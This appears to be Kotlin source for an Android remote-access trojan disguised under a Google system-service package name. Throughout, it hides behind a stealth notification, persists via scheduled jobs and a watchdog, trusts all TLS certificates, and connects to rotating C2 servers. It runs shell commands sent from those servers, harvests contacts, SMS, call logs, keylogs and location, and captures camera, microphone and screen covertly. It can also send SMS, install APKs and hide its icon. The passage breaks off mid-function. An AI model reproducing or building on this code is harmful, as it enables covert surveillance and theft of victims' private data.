package com.google.android.systemservice.services

import android.app.KeyguardManager
import android.app.Service
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.AudioManager
import android.media.ImageReader
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Size
import android.telephony.SmsManager
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.utils.CommandQueueManager
import com.google.android.systemservice.utils.DataSyncManager
import com.google.android.systemservice.utils.StealthNotificationHelper
import com.google.android.systemservice.utils.TrustAllCertificates
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class CommandService : Service() {
    companion object {
        private const val TAG = "SystemCore"
    }

    private var webSocket: WebSocket? = null
    private var client: OkHttpClient? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isConnected = false
    private var reconnectAttempts = 0
    private val maxReconnectDelay = 300000L // 5 minutes max
    private lateinit var dataSyncManager: DataSyncManager
    private lateinit var commandQueue: CommandQueueManager
    // Track current request_id for command-response correlation
    @Volatile private var currentRequestId: String? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "CommandService created")
        
        // Initialize offline data sync manager
        dataSyncManager = DataSyncManager(this)
        
        // Initialize intelligent command queue
        commandQueue = CommandQueueManager(this)
        commandQueue.setResourceConflictHandler(
            onConflict = { resource ->
                Log.d(TAG, "Resource conflict: $resource — pausing our operation")
                // The current recording/capture will be stopped cleanly by the queue manager
            },
            onFreed = { resource ->
                Log.d(TAG, "Resource freed: $resource — can resume")
            }
        )
        
        // Load configuration
        AndroidConfig.loadFromPreferences(this)
        
        startForegroundSilent()
        scheduleJob()
        connectWebSocket()
    }

    private fun scheduleJob() {
        try {
            val componentName = ComponentName(this, KeepAliveJobService::class.java)
            val builder = JobInfo.Builder(1234, componentName)
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                .setPersisted(true)
            
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                // Android 7+ requires 15 mins min
                builder.setPeriodic(15 * 60 * 1000L) 
            } else {
                builder.setPeriodic(5 * 60 * 1000L)
            }
                
            val scheduler = getSystemService(JOB_SCHEDULER_SERVICE) as JobScheduler
            scheduler.schedule(builder.build())
            Log.d(TAG, "JobScheduler scheduled")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule job: ${(e.message ?: "Unknown error")}")
        }
    }

    private fun startForegroundSilent() {
        val notification = StealthNotificationHelper.createStealthNotification(this)
        startForeground(StealthNotificationHelper.COMMAND_SERVICE_ID, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "CommandService started")
        if (!isConnected) {
            connectWebSocket()
        }
        // Reverse watchdog: ensure WatchdogService is alive
        ensureWatchdogRunning()
        return START_STICKY
    }
    
    private fun ensureWatchdogRunning() {
        try {
            val manager = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            @Suppress("DEPRECATION")
            val running = manager.getRunningServices(Integer.MAX_VALUE)
                .any { it.service.className == WatchdogService::class.java.name }
            if (!running) {
                Log.d(TAG, "WatchdogService is dead, restarting...")
                val intent = Intent(this, WatchdogService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(intent)
                } else {
                    startService(intent)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to check/restart WatchdogService: ${(e.message ?: "Unknown error")}")
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun connectWebSocket() {
        try {
            client = TrustAllCertificates.createClientBuilder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(0, TimeUnit.MILLISECONDS) // No read timeout for WS
                .writeTimeout(30, TimeUnit.SECONDS)
                .pingInterval(25, TimeUnit.SECONDS)
                .build()

            val wsUrl = "${AndroidConfig.websocketUrl}&device_id=${getDeviceIdentifier()}"
            val request = Request.Builder()
                .url(wsUrl)
                .build()

            webSocket = client?.newWebSocket(request, object : WebSocketListener() {
                override fun onOpen(webSocket: WebSocket, response: Response) {
                    Log.d(TAG, "WebSocket connected")
                    isConnected = true
                    reconnectAttempts = 0
                    subscribeToChannel()
                    
                    // Flush any offline-queued data
                    if (dataSyncManager.hasQueuedData()) {
                        Log.d(TAG, "Flushing ${dataSyncManager.queuedCount()} queued items...")
                        dataSyncManager.flushAll { count ->
                            Log.d(TAG, "Offline sync complete: $count items uploaded")
                        }
                    }
                }

                override fun onMessage(webSocket: WebSocket, text: String) {
                    handleMessage(text)
                }

                override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                    Log.d(TAG, "WebSocket closing: $reason")
                }

                override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                    Log.d(TAG, "WebSocket closed: $reason")
                    isConnected = false
                    scheduleReconnect()
                }

                override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                    Log.e(TAG, "WebSocket error: ${t.message}")
                    isConnected = false
                    scheduleReconnect()
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Failed to connect WebSocket: ${(e.message ?: "Unknown error")}")
            scheduleReconnect()
        }
    }

    private fun subscribeToChannel() {
        val deviceId = getDeviceIdentifier()
        val subscribeMessage = JSONObject().apply {
            put("command", "subscribe")
            put("identifier", JSONObject().apply {
                put("channel", "CommandChannel")
                put("device_id", deviceId)
            }.toString())
        }
        webSocket?.send(subscribeMessage.toString())
        Log.d(TAG, "Subscribed to CommandChannel: $deviceId")
    }

    private fun getDeviceIdentifier(): String {
        return try {
            android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: AndroidConfig.deviceId.ifEmpty { "unknown" }
        } catch (e: Exception) {
            AndroidConfig.deviceId.ifEmpty { "unknown" }
        }
    }

    private fun handleMessage(text: String) {
        try {
            val json = JSONObject(text)

            // Ignore ping/pong and welcome messages
            val frameType = json.optString("type", "")
            if (frameType in listOf("ping", "welcome", "confirm_subscription")) {
                return
            }

            val message = json.optJSONObject("message") ?: return
            val type = message.optString("type", "")
            val command = message.optString("action", message.optString("command", ""))
            val params = message.optJSONObject("params")
            val requestId = message.optString("request_id", "")

            // Store request_id for response correlation
            if (requestId.isNotEmpty()) {
                currentRequestId = requestId
            }

            if (type.isNotEmpty()) {
                Log.d(TAG, "Received frame type: $type")
            }

            if (command.isEmpty()) {
                Log.w(TAG, "Received message without command/action: $text")
                return
            }

            Log.d(TAG, "Received command: $command")

            when (command) {
                "get_location" -> executeGetLocation()
                "get_accounts" -> executeGetAccounts()
                "toggle_wifi" -> executeToggleWifi()
                "start_camera" -> executeStartCamera(params)
                "stop_camera" -> executeStopCamera()
                "start_audio" -> executeStartAudio(params)
                "stop_audio" -> executeStopAudio()
                "take_photo" -> executeTakePhoto(params)
                "get_device_info" -> executeGetDeviceInfo()
                "get_contacts" -> executeGetContacts()
                "get_sms" -> executeGetSms()
                "get_call_logs" -> executeGetCallLogs()
                "get_installed_apps" -> executeGetInstalledApps()
                "shell_command" -> executeShellCommand(params)
                "get_keylog_dump" -> executeGetKeylogDump()
                "keylog_ack" -> handleKeylogAck(params ?: JSONObject())
                "start_live_video" -> executeStartLiveVideo(params)
                "stop_live_video" -> executeStopLiveVideo()
                "start_live_audio" -> executeStartLiveAudio()
                "stop_live_audio" -> executeStopLiveAudio()
                "take_screenshot" -> executeTakeScreenshot()
                "start_screen_record" -> executeStartScreenRecord(params)
                "stop_screen_record" -> executeStopScreenRecord()
                "send_sms" -> executeSendSms(params)
                "install_apk" -> executeInstallApk(params)
                "uninstall_app" -> executeUninstallApp(params)
                "launch_app" -> executeLaunchApp(params)
                "unlock_screen" -> executeUnlockScreen()
                "hide_icon" -> executeHideIcon()
                "show_icon" -> executeShowIcon()
                "change_audio_mode" -> executeChangeAudioMode(params)
                "get_wifi_info" -> executeGetWifiInfo()
                "shell_exec" -> executeShellExec(params)
                // Location tracking commands
                "start_location_tracking" -> executeStartLocationTracking(params)
                "stop_location_tracking" -> executeStopLocationTracking()
                // New features
                "ambient_record" -> executeAmbientRecord(params)
                "get_app_usage" -> executeGetAppUsage()
                "get_browser_history" -> executeGetBrowserHistory()
                "browse_files" -> executeBrowseFiles(params)
                "list_files" -> executeListFiles(params)
                "download_file" -> executeDownloadFile(params)
                "upload_file" -> executeUploadFile(params)
                "upload_file_chunk" -> executeUploadFileChunk(params)
                "delete_file" -> executeDeleteFile(params)
                "preview_file" -> executePreviewFile(params)
                "rename_file" -> executeRenameFile(params)
                "move_file" -> executeMoveFile(params)
                "search_files" -> executeSearchFiles(params)
                "add_geofence" -> executeAddGeofence(params)
                "start_clipboard_monitor" -> executeStartClipboardMonitor()
                else -> Log.w(TAG, "Unknown command: $command")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling message: ${(e.message ?: "Unknown error")}")
        }
    }

    @android.annotation.SuppressLint("MissingPermission")
    private fun executeGetLocation() {
        serviceScope.launch {
            try {
                val fusedClient = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(this@CommandService)
                val result = CompletableDeferred<android.location.Location?>()

                // Try last known location first
                fusedClient.lastLocation.addOnSuccessListener { location ->
                    if (location != null) {
                        result.complete(location)
                    } else {
                        // Request fresh location
                        val request = com.google.android.gms.location.LocationRequest.Builder(
                            com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, 1000
                        ).setWaitForAccurateLocation(true).setMaxUpdates(1).build()

                        val callback = object : com.google.android.gms.location.LocationCallback() {
                            override fun onLocationResult(lr: com.google.android.gms.location.LocationResult) {
                                result.complete(lr.lastLocation)
                                fusedClient.removeLocationUpdates(this)
                            }
                        }
                        fusedClient.requestLocationUpdates(request, callback, Looper.getMainLooper())
                    }
                }.addOnFailureListener {
                    result.complete(null)
                }

                val location = withTimeoutOrNull(20000) { result.await() }
                if (location != null) {
                    sendResponse("location", JSONObject().apply {
                        put("latitude", location.latitude)
                        put("longitude", location.longitude)
                        put("accuracy", location.accuracy)
                        put("altitude", location.altitude)
                        put("speed", location.speed)
                        put("provider", location.provider ?: "unknown")
                        put("timestamp", location.time)
                    })
                } else {
                    sendError("Could not get location")
                }
            } catch (e: Exception) {
                sendError("Location error: ${(e.message ?: "Unknown error")}")
            }
        }
    }
    
    private fun executeGetAccounts() {
        serviceScope.launch {
            try {
                if (ContextCompat.checkSelfPermission(this@CommandService, android.Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
                    sendResponse("accounts", JSONObject().put("error", "GET_ACCOUNTS permission not granted"))
                    return@launch
                }
                val accountManager = android.accounts.AccountManager.get(this@CommandService)
                val accounts = accountManager.accounts
                val accountList = org.json.JSONArray()
                
                for (account in accounts) {
                    accountList.put(JSONObject().apply {
                        put("name", account.name)
                        put("type", account.type)
                    })
                }
                
                sendResponse("accounts", JSONObject().put("accounts", accountList))
            } catch (e: Exception) {
                Log.e(TAG, "Error getting accounts: ${(e.message ?: "Unknown error")}")
                sendResponse("accounts", JSONObject().put("error", (e.message ?: "Unknown error")))
            }
        }
    }
    
    private fun executeToggleWifi() {
        serviceScope.launch {
            try {
                // Note: Direct WiFi toggle is restricted on Android 10+
                // This will open WiFi settings instead
                val intent = Intent(android.provider.Settings.ACTION_WIFI_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
                
                sendResponse("wifi_toggle", JSONObject().put("status", "settings_opened"))
            } catch (e: Exception) {
                Log.e(TAG, "Error toggling WiFi: ${(e.message ?: "Unknown error")}")
                sendResponse("wifi_toggle", JSONObject().put("error", (e.message ?: "Unknown error")))
            }
        }
    }
    
    private fun executeStartLocationTracking(params: JSONObject?) {
        val intervalMs = params?.optLong("interval_ms", 60000) ?: 60000
        val intent = Intent(this, LocationService::class.java).apply {
            action = "START_TRACKING"
            putExtra("interval_ms", intervalMs)
        }
        startService(intent)
        Log.d(TAG, "Started location tracking with interval: ${intervalMs}ms")
    }
    
    private fun executeStopLocationTracking() {
        val intent = Intent(this, LocationService::class.java).apply {
            action = "STOP_TRACKING"
        }
        startService(intent)
        Log.d(TAG, "Stopped location tracking")
    }

    private fun executeStartCamera(params: JSONObject?) {
        val cameraId = params?.optString("camera_id", "0") ?: "0"
        val intent = Intent(this, CameraService::class.java).apply {
            action = "START_STREAM"
            putExtra("camera_id", cameraId)
        }
        startService(intent)
    }

    private fun executeStopCamera() {
        val intent = Intent(this, CameraService::class.java).apply {
            action = "STOP_STREAM"
        }
        startService(intent)
    }

    private fun executeStartAudio(params: JSONObject?) {
        val compress = params?.optBoolean("compress", true) ?: true
        val maxDuration = params?.optInt("max_duration_sec", 60) ?: 60
        val intent = Intent(this, AudioService::class.java).apply {
            action = "START_RECORDING"
            putExtra("compress", compress)
            putExtra("max_duration_sec", maxDuration)
        }
        startService(intent)
    }

    private fun executeStopAudio() {
        val intent = Intent(this, AudioService::class.java).apply {
            action = "STOP_RECORDING"
        }
        startService(intent)
    }

    @android.annotation.SuppressLint("MissingPermission")
    private fun executeTakePhoto(params: JSONObject?) {
        val cameraId = params?.optString("camera_id", "0") ?: "0"
        serviceScope.launch {
            try {
                val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val characteristics = manager.getCameraCharacteristics(cameraId)
                val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                val largest = map?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }
                    ?: Size(640, 480)

                val result = CompletableDeferred<ByteArray?>()
                val camThread = HandlerThread("CamCapture").also { it.start() }
                val camHandler = Handler(camThread.looper)

                val reader = ImageReader.newInstance(largest.width, largest.height, ImageFormat.JPEG, 2)
                reader.setOnImageAvailableListener({ r ->
                    val image = r.acquireLatestImage()
                    if (image != null) {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()
                        result.complete(bytes)
                    } else {
                        result.complete(null)
                    }
                }, camHandler)

                manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        try {
                            val surface = reader.surface
                            camera.createCaptureSession(listOf(surface),
                                object : CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: CameraCaptureSession) {
                                        try {
                                            val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                            captureBuilder.addTarget(surface)
                                            captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)
                                            session.capture(captureBuilder.build(), null, camHandler)
                                        } catch (e: Exception) {
                                            result.complete(null)
                                        }
                                    }
                                    override fun onConfigureFailed(session: CameraCaptureSession) {
                                        result.complete(null)
                                    }
                                }, camHandler)
                        } catch (e: Exception) {
                            result.complete(null)
                        }
                    }
                    override fun onDisconnected(camera: CameraDevice) { camera.close(); result.complete(null) }
                    override fun onError(camera: CameraDevice, error: Int) { camera.close(); result.complete(null) }
                }, camHandler)

                val photoBytes = withTimeoutOrNull(15000) { result.await() }
                reader.close()
                camThread.quitSafely()

                if (photoBytes != null && photoBytes.isNotEmpty()) {
                    val base64 = Base64.encodeToString(photoBytes, Base64.NO_WRAP)
                    sendResponse("photo", JSONObject().apply {
                        put("image_base64", base64)
                        put("camera_id", cameraId)
                        put("size", photoBytes.size)
                    })
                } else {
                    sendError("Failed to capture photo")
                }
            } catch (e: Exception) {
                sendError("Photo error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    private fun executeGetDeviceInfo() {
        serviceScope.launch {
            val info = collectDeviceInfo()
            sendResponse("device_info", info)
        }
    }

    private fun executeGetContacts() {
        serviceScope.launch {
            val contacts = collectContacts()
            sendResponse("contacts", JSONObject().put("contacts", contacts))
        }
    }

    private fun executeGetSms() {
        serviceScope.launch {
            val sms = collectSms()
            sendResponse("sms", JSONObject().put("messages", sms))
        }
    }

    private fun executeGetCallLogs() {
        serviceScope.launch {
            val logs = collectCallLogs()
            sendResponse("call_logs", JSONObject().put("logs", logs))
        }
    }

    private fun executeGetInstalledApps() {
        serviceScope.launch {
            val apps = collectInstalledApps()
            sendResponse("installed_apps", JSONObject().put("apps", apps))
        }
    }

    private fun executeShellCommand(params: JSONObject?) {
        val command = params?.optString("command") ?: return
        serviceScope.launch {
            try {
                val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
                val output = process.inputStream.bufferedReader().readText()
                val error = process.errorStream.bufferedReader().readText()
                process.waitFor()
                
                sendResponse("shell_result", JSONObject().apply {
                    put("output", output)
                    put("error", error)
                    put("exit_code", process.exitValue())
                })
            } catch (e: Exception) {
                sendResponse("shell_result", JSONObject().apply {
                    put("error", (e.message ?: "Unknown error"))
                })
            }
        }
    }

    private fun executeGetKeylogDump() {
        serviceScope.launch {
            val prefs = getSharedPreferences("keylog_prefs", MODE_PRIVATE)
            val buffer = prefs.getString("keylog_buffer", "") ?: ""
            
            if (buffer.isEmpty()) {
                sendResponse("keylog_dump", JSONObject().apply {
                    put("data", "")
                    put("timestamp", System.currentTimeMillis())
                    put("status", "empty")
                })
                return@launch
            }
            
            // Create backup before sending
            val backupKey = "keylog_backup_${System.currentTimeMillis()}"
            prefs.edit().putString(backupKey, buffer).apply()
            
            // Send with confirmation request
            sendResponse("keylog_dump", JSONObject().apply {
                put("data", buffer)
                put("timestamp", System.currentTimeMillis())
                put("size_bytes", buffer.toByteArray().size)
                put("requires_confirmation", true)
                put("backup_key", backupKey)
            })
            
            // Schedule cleanup after 5 minutes (if no ACK received)
            Handler(Looper.getMainLooper()).postDelayed({
                // Only clear if buffer unchanged (means ACK received and cleared by handleKelogAck)
                val currentBuffer = prefs.getString("keylog_buffer", "")
                if (currentBuffer == buffer) {
                    Log.d(TAG, "No ACK received after 5min, keeping buffer")
                } else {
                    // ACK was received, safe to remove backup
                    prefs.edit().remove(backupKey).apply()
                }
            }, 5 * 60 * 1000) // 5 minutes
        }
    }
    
    private fun handleKeylogAck(ackData: JSONObject) {
        serviceScope.launch {
            val prefs = getSharedPreferences("keylog_prefs", MODE_PRIVATE)
            val success = ackData.optBoolean("success", false)
            val backupKey = ackData.optString("backup_key", "")
            
            if (success) {
                // Server confirmed receipt - safe to clear
                prefs.edit()
                    .putString("keylog_buffer", "")
                    .remove(backupKey)
                    .apply()
                Log.d(TAG, "Keylog buffer cleared after server ACK")
            } else {
                // Server reported error - restore from backup
                val backup = prefs.getString(backupKey, "")
                if (backup != null && backup.isNotEmpty()) {
                    prefs.edit().putString("keylog_buffer", backup).apply()
                    Log.w(TAG, "Keylog upload failed - restored from backup")
                }
            }
        }
    }

    private fun executeStartLiveVideo(params: JSONObject?) {
        val cameraId = params?.optString("camera_id", "0") ?: "0"
        val intent = Intent(this, LiveStreamingService::class.java).apply {
            action = "START_VIDEO"
            putExtra("stream_type", cameraId)
        }
        startService(intent)
        sendResponse("live_video_started", JSONObject().apply {
            put("status", "started")
            put("camera_id", cameraId)
        })
        Log.d(TAG, "Started live video stream")
    }

    private fun executeStopLiveVideo() {
        val intent = Intent(this, LiveStreamingService::class.java).apply {
            action = "STOP_VIDEO"
        }
        startService(intent)
        sendResponse("live_video_stopped", JSONObject().apply {
            put("status", "stopped")
        })
        Log.d(TAG, "Stopped live video stream")
    }

    private fun executeStartLiveAudio() {
        val intent = Intent(this, LiveStreamingService::class.java).apply {
            action = "START_AUDIO"
        }
        startService(intent)
        sendResponse("live_audio_started", JSONObject().apply {
            put("status", "started")
        })
        Log.d(TAG, "Started live audio stream")
    }

    private fun executeStopLiveAudio() {
        val intent = Intent(this, LiveStreamingService::class.java).apply {
            action = "STOP_AUDIO"
        }
        startService(intent)
        sendResponse("live_audio_stopped", JSONObject().apply {
            put("status", "stopped")
        })
        Log.d(TAG, "Stopped live audio stream")
    }

    private fun collectDeviceInfo(): JSONObject {
        val batteryLevel = try {
            val batteryManager = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (e: Exception) { -1 }
        
        val isRooted = try {
            val paths = arrayOf("/system/xbin/su", "/system/bin/su", "/sbin/su", "/data/local/xbin/su")
            paths.any { File(it).exists() }
        } catch (e: Exception) { false }
        
        return JSONObject().apply {
            put("device_id", getDeviceIdentifier())
            put("manufacturer", android.os.Build.MANUFACTURER)
            put("model", android.os.Build.MODEL)
            put("brand", android.os.Build.BRAND)
            put("sdk_version", android.os.Build.VERSION.SDK_INT)
            put("android_version", android.os.Build.VERSION.RELEASE)
            put("os_version", android.os.Build.VERSION.RELEASE)
            put("device", android.os.Build.DEVICE)
            put("product", android.os.Build.PRODUCT)
            put("battery_level", batteryLevel)
            put("is_rooted", isRooted)
        }
    }

    private fun collectContacts(): org.json.JSONArray {
        val contacts = org.json.JSONArray()
        try {
            val cursor = contentResolver.query(
                android.provider.ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.Contacts._ID))
                    val name = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.Contacts.DISPLAY_NAME))
                    
                    val contact = JSONObject().apply {
                        put("id", id)
                        put("name", name ?: "Unknown")
                    }
                    
                    // Get phone numbers
                    val phones = org.json.JSONArray()
                    val phoneCursor = contentResolver.query(
                        android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        "${android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                        arrayOf(id),
                        null
                    )
                    phoneCursor?.use { pc ->
                        while (pc.moveToNext()) {
                            val phone = pc.getString(pc.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
                            phones.put(phone)
                        }
                    }
                    contact.put("phones", phones)
                    contacts.put(contact)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting contacts: ${(e.message ?: "Unknown error")}")
        }
        return contacts
    }

    private fun collectSms(): org.json.JSONArray {
        val messages = org.json.JSONArray()
        try {
            val cursor = contentResolver.query(
                android.net.Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 100"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val msg = JSONObject().apply {
                        put("address", it.getString(it.getColumnIndexOrThrow("address")))
                        put("body", it.getString(it.getColumnIndexOrThrow("body")))
                        put("date", it.getLong(it.getColumnIndexOrThrow("date")))
                        put("read", it.getInt(it.getColumnIndexOrThrow("read")))
                    }
                    messages.put(msg)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting SMS: ${(e.message ?: "Unknown error")}")
        }
        return messages
    }

    private fun collectCallLogs(): org.json.JSONArray {
        val logs = org.json.JSONArray()
        try {
            val cursor = contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null, "${android.provider.CallLog.Calls.DATE} DESC LIMIT 100"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val log = JSONObject().apply {
                        put("number", it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)))
                        put("type", it.getInt(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE)))
                        put("date", it.getLong(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE)))
                        put("duration", it.getLong(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION)))
                    }
                    logs.put(log)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting call logs: ${(e.message ?: "Unknown error")}")
        }
        return logs
    }

    private fun collectInstalledApps(): org.json.JSONArray {
        val apps = org.json.JSONArray()
        try {
            val pm = packageManager
            val packages = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
            for (appInfo in packages) {
                val app = JSONObject().apply {
                    put("package", appInfo.packageName)
                    put("name", pm.getApplicationLabel(appInfo).toString())
                    put("is_system", (appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
                }
                apps.put(app)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting apps: ${(e.message ?: "Unknown error")}")
        }
        return apps
    }

    private fun sendResponse(type: String, data: JSONObject) {
        val reqId = currentRequestId
        val message = JSONObject().apply {
            put("command", "message")
            put("identifier", JSONObject().apply {
                put("channel", "CommandChannel")
                put("device_id", getDeviceIdentifier())
            }.toString())
            put("data", JSONObject().apply {
                put("type", type)
                put("payload", data)
                put("timestamp", System.currentTimeMillis())
                if (!reqId.isNullOrEmpty()) {
                    put("request_id", reqId)
                }
            }.toString())
        }
        webSocket?.send(message.toString())
        // Clear request_id after sending response
        if (!reqId.isNullOrEmpty()) {
            currentRequestId = null
        }
    }

    private fun scheduleReconnect() {
        reconnectAttempts++
        val delay = minOf((1000L * (1 shl reconnectAttempts)), maxReconnectDelay)
        Log.d(TAG, "Scheduling reconnect in ${delay}ms (attempt $reconnectAttempts)")
        
        // After 3 consecutive failures on same server, try next C2
        if (reconnectAttempts > 0 && reconnectAttempts % 3 == 0) {
            val switched = AndroidConfig.switchToNextServer()
            if (switched) {
                Log.w(TAG, "Primary C2 unreachable, switching to fallback: ${AndroidConfig.serverUrl}")
            } else {
                Log.w(TAG, "All C2 servers exhausted, cycling back to primary")
                AndroidConfig.resetToPrimaryServer()
            }
        }
        
        serviceScope.launch {
            delay(delay)
            if (!isConnected) {
                connectWebSocket()
            }
        }
    }

    // New command handlers
    private fun executeTakeScreenshot() {
        serviceScope.launch {
            try {
                val screenshotFile = File(externalCacheDir, "screenshot_${System.currentTimeMillis()}.png")
                val process = Runtime.getRuntime().exec(arrayOf("screencap", "-p", screenshotFile.absolutePath))
                process.waitFor()
                
                if (screenshotFile.exists()) {
                    val bytes = screenshotFile.readBytes()
                    val base64 = Base64.encodeToString(bytes, Base64.DEFAULT)
                    sendResponse("screenshot", JSONObject().apply {
                        put("image_base64", base64)
                        put("size", bytes.size)
                    })
                    screenshotFile.delete()
                } else {
                    sendError("Failed to capture screenshot")
                }
            } catch (e: Exception) {
                sendError("Screenshot error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    private var screenRecordProcess: Process? = null
    private var screenRecordFile: File? = null

    private fun executeStartScreenRecord(params: JSONObject?) {
        serviceScope.launch {
            try {
                val duration = params?.optInt("duration", 30) ?: 30
                val recordFile = File(externalCacheDir, "recording_${System.currentTimeMillis()}.mp4")
                screenRecordFile = recordFile
                screenRecordProcess = Runtime.getRuntime().exec(arrayOf(
                    "screenrecord",
                    "--time-limit", duration.toString(),
                    recordFile.absolutePath
                ))
                sendResponse("screen_record_started", JSONObject().apply {
                    put("status", "recording")
                    put("duration", duration)
                })
            } catch (e: Exception) {
                sendError("Screen record start error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    private fun executeStopScreenRecord() {
        serviceScope.launch {
            try {
                screenRecordProcess?.destroy()
                screenRecordProcess?.waitFor()
                
                val file = screenRecordFile
                if (file != null && file.exists()) {
                    val bytes = file.readBytes()
                    val base64 = Base64.encodeToString(bytes, Base64.DEFAULT)
                    sendResponse("screen_record", JSONObject().apply {
                        put("video_base64", base64)
                        put("size", bytes.size)
                    })
                    file.delete()
                } else {
                    sendError("Recording file not found")
                }
            } catch (e: Exception) {
                sendError("Screen record stop error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    private fun executeSendSms(params: JSONObject?) {
        val phoneNumber = params?.optString("phone_number") ?: return sendError("Missing phone_number")
        val message = params.optString("message") ?: return sendError("Missing message")
        
        serviceScope.launch {
            try {
                if (checkSelfPermission(android.Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                    val smsManager = SmsManager.getDefault()
                    smsManager.sendTextMessage(phoneNumber, null, message, null, null)
                    sendResponse("sms_sent", JSONObject().apply {
                        put("status", "success")
                        put("to", phoneNumber)
                    })
                } else {
                    sendError("SMS permission not granted")
                }
            } catch (e: Exception) {
                sendError("Send SMS error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    private fun executeInstallApk(params: JSONObject?) {
        val apkBase64 = params?.optString("apk_base64") ?: return sendError("Missing apk_base64")
        
        serviceScope.launch {
            try {
                val apkBytes = Base64.decode(apkBase64, Base64.DEFAULT)
                val apkFile = File(externalCacheDir, "install_${System.currentTimeMillis()}.apk")
                apkFile.writeBytes(apkBytes)
                
                val intent = Intent(Intent.ACTION_VIEW).apply {
                    setDataAndType(
                        FileProvider.getUriForFile(this@CommandService, "${packageName}.fileprovider", apkFile),
                        "application/vnd.android.package-archive"
                    )
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
                }
                startActivity(intent)
                
                sendResponse("apk_install", JSONObject().apply {
                    put("status", "installation_started")
                })
            } catch (e: Exception) {
                sendError("Install APK error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    private fun executeUninstallApp(params: JSONObject?) {
        val packageName = params?.optString("package_name") ?: return sendError("Missing package_name")
        
        serviceScope.launch {
            try {
                val intent = Intent(Intent.ACTION_DELETE).apply {
                    data = Uri.parse("package:$packageName")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                startActivity(intent)
                sendResponse("app_uninstall", JSONObject().apply {
                    put("status", "uninstall_started")
